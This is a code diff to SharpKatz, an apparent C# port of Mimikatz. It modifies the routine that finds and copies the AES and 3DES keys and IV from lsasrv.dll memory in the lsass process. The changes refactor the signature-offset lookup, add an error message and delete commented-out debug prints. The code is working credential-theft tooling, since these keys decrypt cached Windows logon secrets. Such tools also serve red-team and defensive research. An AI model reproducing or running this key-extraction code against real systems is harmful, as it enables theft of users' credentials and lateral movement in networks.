@@ -53,7 +53,10 @@ namespace SharpKatz
 
         public Keys(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper)
         {
-            FindKeys( hLsass,  lsasrvMem, oshelper);
+            if(FindKeys( hLsass,  lsasrvMem, oshelper) != 0)
+            {
+                Console.WriteLine("Error retriving keys");
+            }
         }
 
         public byte[] GetIV()
@@ -82,19 +85,8 @@ namespace SharpKatz
             KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
             IntPtr keyPointer = IntPtr.Zero;
 
-            // Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
-            IntPtr lsasrvLocal = Natives.LoadLibrary("lsasrv.dll");
-            if (lsasrvLocal == IntPtr.Zero) {
-                Console.WriteLine("[x] Error: Could not load lsasrv.dll locally");
-                return 1;
-            }
-            //Console.WriteLine("[*] Loaded lsasrv.dll locally at address {0:X}", lsasrvLocal.ToInt64());
-
-            byte[] tmpbytes = new byte[max_search_size];
-            Marshal.Copy(lsasrvLocal, tmpbytes, 0, (int)max_search_size);
-
             // Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
-            keySigOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.keyIVSig);
+            keySigOffset = (long)Utility.OffsetFromSign("lsasrv.dll", oshelper.keyIVSig, max_search_size); 
             if (keySigOffset == 0)
             {
                 Console.WriteLine("[x] Error: Could not find offset to AES/3Des/IV keys\n");
@@ -141,11 +133,6 @@ namespace SharpKatz
             this.deskey = new byte[Convert.ToInt32(extracted3DesKey.hardkey.cbSecret)];
             Marshal.Copy((IntPtr)extracted3DesKey.hardkey.data, this.deskey, 0, (int)extracted3DesKey.hardkey.cbSecret);
 
-            //Console.WriteLine("[*] 3Des Key recovered as:");
-            //Console.WriteLine("[*] ====[ Start ]====");
-            //Console.WriteLine("[*]  {0}", Utility.PrintHexBytes(this.deskey));
-            //Console.WriteLine("[*] ====[ End ]===");
-
             tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.AES_OFFSET);
 
             // Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
@@ -169,11 +156,6 @@ namespace SharpKatz
             
             this.aeskey = new byte[extractedAesKey.hardkey.cbSecret];
             Marshal.Copy((IntPtr)extractedAesKey.hardkey.data, this.aeskey, 0, (int)extractedAesKey.hardkey.cbSecret);
-
-            //Console.WriteLine("[*] Aes Key recovered as:");
-            //Console.WriteLine("[*] ====[ Start ]====");
-            //Console.WriteLine("[*]  {0}", Utility.PrintHexBytes(this.aeskey));
-            //Console.WriteLine("[*] ====[ End ]===");
             
             return 0;
         }
